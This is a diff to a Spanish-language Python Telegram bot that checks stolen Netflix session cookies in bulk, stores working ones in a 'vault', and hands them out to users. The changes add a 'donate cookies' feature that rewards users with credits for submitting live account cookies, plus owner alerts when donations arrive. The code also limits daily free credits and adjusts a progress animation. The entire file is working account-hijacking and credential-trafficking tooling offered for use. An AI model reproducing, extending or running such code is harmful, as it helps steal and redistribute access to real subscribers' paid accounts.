@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 """
 BILL CYPHER CHK NF — Edition 5G Turbo Definitive
-• Checker ZIP 100% intacto con escaneo masivo rápido y limpio
-• GEN COOKIE con verificación de streaming activo (Cero "Reinicia tu membresía")
-• Corrección de stock: Mantiene siempre las cuentas actuales (300) sin restaurar 1200 viejas
-• Panel compacto de baja altura optimizado para banner multimedia
+• Límite estratégico: 3 créditos diarios gratuitos (Oliveidy recommendation)
+• Sistema interactivo de donación de cookies con recompensa y aviso a @didierJC
+• Monitor de carga animado 5G con fases en tiempo real (porcentaje limpio)
+• Panel ultra compacto optimizado para banner multimedia
 • Enlaces oficiales con parámetros web (PC / Mobile / TV8)
 • Auto-restauración en arranque desde la nube de Telegram (Anti-Wipe)
 • Alertas automáticas de error a @didierJC
@@ -80,13 +80,14 @@ PORT = int(os.environ.get("PORT", 5000))
 # ===========================================================================
 OWNER_ID: int = 5320997298
 OWNER_USER: str = "didierJC"
-OWNER_URL: f"https://t.me/{OWNER_USER}"
+OWNER_URL: str = f"https://t.me/{OWNER_USER}"
 WATERMARK_TEXT: str = "👑 Checked by: @didierJC | BILL CYPHER CHK NF"
 
 def is_admin(uid: int) -> bool:
     return bool(uid and uid == OWNER_ID)
 
 _ASYNC_VAULT_LOCK = asyncio.Lock()
+_DONATE_USERS: set[int] = set()
 
 
 # ===========================================================================
@@ -213,9 +214,9 @@ MAINTENANCE_TEXT = (
 
 
 # ===========================================================================
-# 6. SISTEMA DE CRÉDITOS (15 DIARIOS / REEMBOLSO AUTOMÁTICO)
+# 6. SISTEMA DE CRÉDITOS (ESTRATEGIA 3 DIARIOS / REEMBOLSO AUTOMÁTICO)
 # ===========================================================================
-DAILY_FREE_CREDITS: int = 15
+DAILY_FREE_CREDITS: int = 3
 _CREDITS_FILE = Path("credits.json")
 
 def _load_credits() -> dict:
@@ -322,6 +323,23 @@ def refund_credit(uid: int) -> None:
     data[str(uid)] = user_data
     _save_credits(data)
 
+def add_reward_credit(uid: int, amount: int = 1) -> None:
+    """Otorga créditos bonificados por donar cuentas válidas al baúl."""
+    data = _load_credits()
+    user_data = data.setdefault(str(uid), {"is_premium": False})
+    if user_data.get("is_premium"):
+        creds = user_data.get("credits")
+        if creds != "unlimited":
+            try:
+                user_data["credits"] = int(creds) + amount
+            except ValueError:
+                pass
+    else:
+        used_today = user_data.get("used_today", 0)
+        user_data["used_today"] = max(0, used_today - amount)
+    data[str(uid)] = user_data
+    _save_credits(data)
+
 OUT_OF_CREDITS_TEXT = (
     "⚠️ <b>¡Créditos diarios agotados!</b>\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
@@ -361,7 +379,6 @@ def extract_core_netflix_id(cookie_str: str) -> str:
     return ""
 
 def _load_vault() -> list[str]:
-    """Carga siempre una lista limpia de strings de cookies únicas."""
     if _VAULT_FILE.exists():
         try:
             raw_data = json.loads(_VAULT_FILE.read_text(encoding="utf-8"))
@@ -520,7 +537,6 @@ def verify_streaming_active(nftoken: str) -> bool:
         resp = requests.get(url, headers=headers, timeout=5, allow_redirects=True)
         final_url = resp.url.lower()
 
-        # Si redirige a signup o simplemember, no tiene streaming activo
         if "signup" in final_url or "simplemember" in final_url or "login" in final_url:
             return False
 
@@ -778,6 +794,7 @@ def _main_panel_markup(uid: int) -> InlineKeyboardMarkup:
     rows = [
         [
             InlineKeyboardButton("⚡ " + to_sans_bold_italic("GEN COOKIE") + " 🍿", callback_data="panel:gencookie"),
+            InlineKeyboardButton("🎁 Donar Cookies 💎", callback_data="panel:donate"),
         ],
         [
             InlineKeyboardButton("⚙️ Configuración", callback_data="panel:settings"),
@@ -1492,8 +1509,16 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
 
 
 # ---------------------------------------------------------------------------
-# Procesamiento 5G con Monitor de Carga en Tiempo Real
+# Procesamiento 5G con Monitor de Carga Animado (Fases en tiempo real)
 # ---------------------------------------------------------------------------
+SPINNER_ANIMATION = [
+    ("📡 Escaneando nodos 5G...", "⚡"),
+    ("🔍 Verificando tokens Netflix...", "🔄"),
+    ("🛡️ Validando streaming activo...", "🍿"),
+    ("🚀 Filtrando cuentas funcionales...", "✨"),
+    ("📦 Purgando cookies caídas...", "🧹"),
+]
+
 async def process_cookies(update: Update, status_msg, cookie_text: str, source: str = "") -> None:
     sets = split_cookies_from_text(cookie_text)
     if not sets:
@@ -1540,8 +1565,7 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
     if uid:
         _USER_SESSION[uid] = session_id
 
-    spinner_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
-    frame_idx = 0
+    anim_step = 0
 
     for batch_start in range(0, total, BULK_CONCURRENCY):
         if session_id in _CANCEL_SESSIONS:
@@ -1609,7 +1633,7 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                     txt = format_result({"status": "invalid", "message": "Cookie expirada / fallo de pago."}, idx, total, source=src, user_id=uid)
                     await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
 
-        # Monitor de carga en tiempo real (porcentaje limpio sin duplicación)
+        # Monitor de carga animado en tiempo real con fases (porcentaje limpio sin duplicación)
         if is_bulk:
             now_time = time.monotonic()
             done_so_far = min(batch_start + len(batch), total)
@@ -1617,16 +1641,17 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                 last_edit_time = now_time
                 elapsed = now_time - t_start
                 speed = done_so_far / elapsed if elapsed > 0 else 0
-                frame = spinner_frames[frame_idx % len(spinner_frames)]
-                frame_idx += 1
+                phase_title, phase_icon = SPINNER_ANIMATION[anim_step % len(SPINNER_ANIMATION)]
+                anim_step += 1
                 temp_hits = len(raw_hits_list)
 
                 loading_text = (
-                    f"⚡ <b>" + to_sans_bold_italic("BILL CYPHER | CHECKER 5G") + f"</b> {frame}\n"
+                    f"⚡ <b>" + to_sans_bold_italic("BILL CYPHER | CHECKER 5G") + f"</b> {phase_icon}\n"
                     "━━━━━━━━━━━━━━━━━━━━━━\n"
                     f"📊 <b>Progreso:</b> {make_progress_bar(done_so_far, total)}\n"
                     f"🔄 <b>Procesando:</b> <code>{done_so_far} / {total}</code> cuentas\n"
-                    f"🚀 <b>Velocidad:</b> <code>{speed:.2f} cuentas/seg</code>\n\n"
+                    f"🚀 <b>Velocidad:</b> <code>{speed:.2f} cuentas/seg</code>\n"
+                    f"🌐 <b>Fase:</b> <i>{phase_title}</i>\n\n"
                     f"● 🌟 <b>Hits Detectados:</b> <code>{temp_hits}</code>\n"
                     f"● ❌ <b>Inválidas:</b> <code>{invalids}</code>\n"
                     f"● ⏸️ <b>En espera:</b> <code>{on_hold}</code>\n"
@@ -1670,7 +1695,6 @@ async def process_cookie_sets(update: Update, status_msg, cookie_sets: list[tupl
                 if "FORMER" in ms or "NEVER" in ms or is_payment_issue:
                     return None
                 real_t = extract_bgiqv_token(token_data, tok)
-                # Validación de streaming activo
                 if not verify_streaming_active(real_t):
                     return None
                 res["nftoken"] = token_data
@@ -1921,6 +1945,19 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         except Exception as e:
             await query.message.reply_text(f"❌ Error al sincronizar: {e}")
 
+    elif data == "panel:donate":
+        await query.answer()
+        _DONATE_USERS.add(uid)
+        await query.message.reply_text(
+            "🎁 <b>" + to_sans_bold_italic("DONAR COOKIES DE NETFLIX") + "</b> 🍿\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            "Envía la cookie en texto o adjunta un archivo <code>.txt</code> que deseas donar al baúl.\n\n"
+            "💎 <b>Recompensa automática:</b>\n"
+            "<i>Por cada cookie válida (Live con suscripción activa) que dones, recibirás <b>+1 activación extra</b> al instante.</i>\n\n"
+            "Envía /cancel en cualquier momento si deseas cancelar.",
+            parse_mode=ParseMode.HTML,
+        )
+
     elif data == "panel:gencookie":
         await query.answer()
 
@@ -1994,8 +2031,6 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                         chosen_cookie = candidate_str
                         live_result = chk_res
                         break
-                    else:
-                        logger.info(f"Cuenta descartada por requerir reinicio de membresía: {chk_res.get('email')}")
 
             if chosen_cookie and live_result:
                 delivered_token = live_result.get("netflix_id") or extract_core_netflix_id(chosen_cookie)
@@ -2012,7 +2047,6 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
                     clean_vault.append(it_str)
 
                 _save_vault(clean_vault)
-                # Actualiza el respaldo en la nube con el número EXACTO de cuentas restantes
                 asyncio.create_task(_cloud_auto_save(context.application))
 
         if not chosen_cookie or not live_result:
@@ -2025,7 +2059,6 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             )
             return
 
-        # DATOS 100% COINCIDENTES EXTRAÍDOS DIRECTAMENTE DE LA RESPUESTA EN VIVO
         real_token = extract_bgiqv_token(live_result.get("nftoken", {}), live_result.get("netflix_id"))
         plan = live_result.get("plan_name") or "Premium"
         country = live_result.get("country") or "Desconocido"
@@ -2219,8 +2252,22 @@ async def setbanner_command(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
 
 # ---------------------------------------------------------------------------
-# Gestión de Créditos, Mantenimiento y Auto-Sincronización
+# Gestión de Créditos, Donaciones y Mantenimiento
 # ---------------------------------------------------------------------------
+async def donar_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Permite a los usuarios donar cuentas al baúl a cambio de créditos."""
+    uid = update.effective_user.id if update.effective_user else 0
+    _DONATE_USERS.add(uid)
+    await update.message.reply_text(
+        "🎁 <b>" + to_sans_bold_italic("DONAR COOKIES DE NETFLIX") + "</b> 🍿\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "Envía la cookie en texto o adjunta un archivo <code>.txt</code> que deseas donar al baúl.\n\n"
+        "💎 <b>Recompensa automática:</b>\n"
+        "<i>Por cada cookie válida (Live con suscripción activa) que dones, recibirás <b>+1 activación extra</b> al instante.</i>\n\n"
+        "Envía /cancel en cualquier momento si deseas cancelar.",
+        parse_mode=ParseMode.HTML,
+    )
+
 async def setcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id if update.effective_user else 0
     if not is_admin(uid):
@@ -2738,6 +2785,10 @@ async def _handle_changepw_input(update: Update, uid: int, text: str) -> None:
 # ---------------------------------------------------------------------------
 async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id if update.effective_user else 0
+    if uid in _DONATE_USERS:
+        _DONATE_USERS.discard(uid)
+        await update.message.reply_text("❌ <b>Donación cancelada.</b>", parse_mode=ParseMode.HTML)
+        return
     if uid in _CHANGEPW_STATE:
         _CHANGEPW_STATE.pop(uid, None)
         await update.message.reply_text("❌ <b>Cambio de contraseña cancelado.</b>", parse_mode=ParseMode.HTML)
@@ -2855,8 +2906,78 @@ async def proxy_admin_callback(update: Update, context: ContextTypes.DEFAULT_TYP
 
 
 # ---------------------------------------------------------------------------
-# Procesamiento de documentos y texto entrante
+# Procesamiento de documentos y texto entrante (Incluye Donaciones)
 # ---------------------------------------------------------------------------
+async def _process_donation(update: Update, context: ContextTypes.DEFAULT_TYPE, cookie_text: str) -> None:
+    uid = update.effective_user.id if update.effective_user else 0
+    _DONATE_USERS.discard(uid)
+
+    status_msg = await update.message.reply_text("⚡ <i>Comprobando donación en vivo...</i>", parse_mode=ParseMode.HTML)
+    loop = asyncio.get_running_loop()
+
+    blocks = split_cookies_from_text(cookie_text)
+    if not blocks:
+        await status_msg.edit_text("❌ No se detectaron cookies de Netflix válidas en el texto enviado.")
+        return
+
+    donated_count = 0
+    vault = _load_vault()
+    existing_tokens = {extract_core_netflix_id(c) for c in vault if extract_core_netflix_id(c)}
+
+    for b in blocks:
+        tok = extract_core_netflix_id(b)
+        if not tok or tok in existing_tokens:
+            continue
+
+        chk_res = await loop.run_in_executor(
+            _EXECUTOR,
+            lambda: safe_check_cookie_clean(b, generate_token=True)
+        )
+
+        st = normalize_status(chk_res.get("status"), chk_res)
+        ms = str(chk_res.get("membership_status") or "").upper()
+        issues_str = " ".join(chk_res.get("account_issues") or []).lower()
+        is_payment_issue = chk_res.get("is_on_hold") or ("payment" in issues_str or "pago" in issues_str)
+        nft_res = chk_res.get("nftoken") or {}
+
+        if st == "hit" and not is_payment_issue and "FORMER" not in ms and "NEVER" not in ms and nft_res.get("success"):
+            real_t = extract_bgiqv_token(nft_res, tok)
+            if verify_streaming_active(real_t):
+                vault.append(b.strip())
+                existing_tokens.add(tok)
+                donated_count += 1
+
+    if donated_count > 0:
+        _save_vault(vault)
+        add_reward_credit(uid, donated_count)
+        asyncio.create_task(_cloud_auto_save(context.application))
+
+        await status_msg.edit_text(
+            f"🎉 <b>¡DONACIÓN EXITOSA!</b>\n"
+            "━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"● 🍿 <b>Cuentas agregadas al baúl:</b> <code>{donated_count}</code>\n"
+            f"● 💎 <b>Recompensa otorgada:</b> <code>+{donated_count} activaciones</code>\n\n"
+            "<i>¡Muchas gracias por apoyar a la comunidad!</i>",
+            parse_mode=ParseMode.HTML,
+        )
+
+        # Notificación al propietario
+        u_label = f"@{update.effective_user.username}" if update.effective_user.username else update.effective_user.first_name
+        try:
+            await context.bot.send_message(
+                chat_id=OWNER_ID,
+                text=f"🎁 <b>¡NUEVA DONACIÓN RECIBIDA!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n● 👤 Usuario: {u_label} (<code>{uid}</code>)\n● 📦 Cuentas agregadas: <code>{donated_count}</code>\n● 🗄️ Stock total: <code>{len(vault)}</code>",
+                parse_mode=ParseMode.HTML,
+            )
+        except Exception:
+            pass
+    else:
+        await status_msg.edit_text(
+            "⚠️ <b>La cuenta enviada no tiene suscripción activa o ya está en el baúl.</b>\n"
+            "<i>No se pudo agregar, pero ¡muchas gracias por tu intención de colaborar!</i>",
+            parse_mode=ParseMode.HTML,
+        )
+
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     doc: Document = update.message.document
     uid = update.effective_user.id if update.effective_user else None
@@ -2881,14 +3002,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         await update.message.reply_text(MAINTENANCE_TEXT, parse_mode=ParseMode.HTML)
         return
 
-    if not consume_credit(uid):
-        await update.message.reply_text(
-            OUT_OF_CREDITS_TEXT,
-            parse_mode=ParseMode.HTML,
-            reply_markup=out_of_credits_markup()
-        )
-        return
-
     if uid in _ACTIVE_USERS:
         refund_credit(uid)
         await update.message.reply_text("⏳ Ya tienes una comprobación activa. Espera a que termine.", parse_mode=ParseMode.HTML)
@@ -2909,16 +3022,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         await update.message.reply_text("❌ Formato no compatible. Envía un <code>.txt</code>, <code>.json</code> o <code>.zip</code>.", parse_mode=ParseMode.HTML)
         return
 
-    if uid:
-        _ACTIVE_USERS[uid] = time.time()
-
-    status_msg = await update.message.reply_text(
-        "⚡ <b>" + to_sans_bold_italic("BILL CYPHER | INICIALIZANDO") + "</b>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        "📥 <i>Descargando archivo de cookies...</i>\n"
-        "━━━━━━━━━━━━━━━━━━━━━━",
-        parse_mode=ParseMode.HTML
-    )
     suffix = ".zip" if is_zip else (Path(fname).suffix or ".txt")
     tmp_path = None
 
@@ -2934,10 +3037,43 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
     if tmp_path is None:
         refund_credit(uid)
-        await status_msg.edit_text("⚠️ Error al descargar el archivo.")
-        if uid:
-            _ACTIVE_USERS.pop(uid, None)
+        await update.message.reply_text("⚠️ Error al descargar el archivo.")
         return
+
+    # Si el usuario estaba en modo donación
+    if uid and uid in _DONATE_USERS:
+        with open(tmp_path, "rb") as f:
+            raw_b = f.read()
+        try:
+            os.unlink(tmp_path)
+        except Exception:
+            pass
+        await _process_donation(update, context, raw_b.decode("utf-8", errors="replace"))
+        return
+
+    # Si es un checkeo normal, comprueba créditos
+    if not consume_credit(uid):
+        try:
+            os.unlink(tmp_path)
+        except Exception:
+            pass
+        await update.message.reply_text(
+            OUT_OF_CREDITS_TEXT,
+            parse_mode=ParseMode.HTML,
+            reply_markup=out_of_credits_markup()
+        )
+        return
+
+    if uid:
+        _ACTIVE_USERS[uid] = time.time()
+
+    status_msg = await update.message.reply_text(
+        "⚡ <b>" + to_sans_bold_italic("BILL CYPHER | INICIALIZANDO") + "</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n"
+        "📥 <i>Descargando archivo de cookies...</i>\n"
+        "━━━━━━━━━━━━━━━━━━━━━━",
+        parse_mode=ParseMode.HTML
+    )
 
     original_name = doc.file_name or "desconocido"
 
@@ -3015,6 +3151,10 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> Non
 
     if is_maintenance() and not is_admin(uid):
         await update.message.reply_text(MAINTENANCE_TEXT, parse_mode=ParseMode.HTML)
+        return
+
+    if uid and uid in _DONATE_USERS:
+        await _process_donation(update, context, text)
         return
 
     if uid and uid in _CHANGEPW_STATE:
@@ -3162,12 +3302,13 @@ def main() -> None:
     app.add_handler(CommandHandler(["broadcast", "notif"], broadcast_command))
     app.add_handler(CommandHandler("users",         users_command))
     app.add_handler(CommandHandler("setbanner",     setbanner_command))
-    app.add_handler(CommandHandler("addvault",   addvault_command))
-    app.add_handler(CommandHandler("clearvault", clearvault_command))
-    app.add_handler(CommandHandler("setcredits", setcredits_command))
-    app.add_handler(CommandHandler("backup",     backup_command))
-    app.add_handler(CommandHandler("restore",    restore_command))
+    app.add_handler(CommandHandler("addvault",      addvault_command))
+    app.add_handler(CommandHandler("clearvault",    clearvault_command))
+    app.add_handler(CommandHandler("setcredits",    setcredits_command))
+    app.add_handler(CommandHandler("backup",        backup_command))
+    app.add_handler(CommandHandler("restore",       restore_command))
     app.add_handler(CommandHandler(["mantenimiento", "maintenance"], maintenance_command))
+    app.add_handler(CommandHandler(["donar", "donate"], donar_command))
     app.add_handler(CommandHandler("testerror",     testerror_command))
 
     # Callbacks interactivos
@@ -3215,6 +3356,7 @@ def main() -> None:
 
         user_commands = [
             BotCommand("start",    "Panel principal"),
+            BotCommand("donar",    "Donar cookies al baúl (+1 crédito)"),
             BotCommand("settings", "Configurar formato y entrega"),
             BotCommand("mode",     "Cambiar modo (Básico / Full)"),
             BotCommand("basic",    "Activar modo básico"),
